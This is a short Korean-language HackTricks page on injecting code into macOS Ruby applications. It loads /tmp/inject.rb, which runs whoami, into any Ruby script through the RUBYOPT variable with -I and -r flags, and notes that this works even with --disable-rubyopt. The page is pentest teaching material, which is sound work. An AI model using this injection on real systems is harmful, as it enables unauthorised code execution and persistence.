# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

이 환경 변수를 사용하면 **ruby**가 실행될 때 **새로운 매개변수**를 **추가**할 수 있습니다. 매개변수 **`-e`**는 실행할 ruby 코드를 지정하는 데 사용할 수 없지만, 매개변수 **`-I`**와 **`-r`**를 사용하여 로드 경로에 새 폴더를 추가한 다음 **로드할 라이브러리**를 **지정**할 수 있습니다.

라이브러리 **`inject.rb`**를 **`/tmp`**에 생성합니다:
```ruby:inject.rb
puts `whoami`
```
어디에나 다음과 같은 루비 스크립트를 생성하세요:
```ruby:hello.rb
puts 'Hello, World!'
```
그런 다음 임의의 루비 스크립트를 다음과 같이 로드합니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
재미있는 사실, **`--disable-rubyopt`** 매개변수와 함께 작동합니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
